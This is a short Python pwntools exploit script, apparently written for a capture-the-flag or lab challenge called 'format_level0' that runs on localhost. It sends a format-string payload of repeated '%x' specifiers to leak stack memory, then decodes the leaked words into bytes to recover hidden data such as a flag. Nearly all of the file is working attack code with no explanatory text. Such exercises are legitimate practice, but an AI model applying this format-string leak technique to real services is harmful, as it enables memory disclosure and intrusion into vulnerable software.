#!/usr/bin/python3
from pwn import *
context(log_level='debug')

#p= process('./format_level0')
p = remote('localhost', 41597)
#gdb.attach(p, 'b printf')

#payload = b'aa%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c'
payload = b'aa%x%x%x%x%x%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x'
print(len(payload))
p.recv()
p.send(payload)
p.recvuntil(b'is: ')
str = p.recv()
lst = str.split(b'-')[1:]
print(lst)
for i in lst:
    str = b''
    tmp = p32(int(i,16))
    print(tmp.decode(), end='')
    str += tmp

print(str)
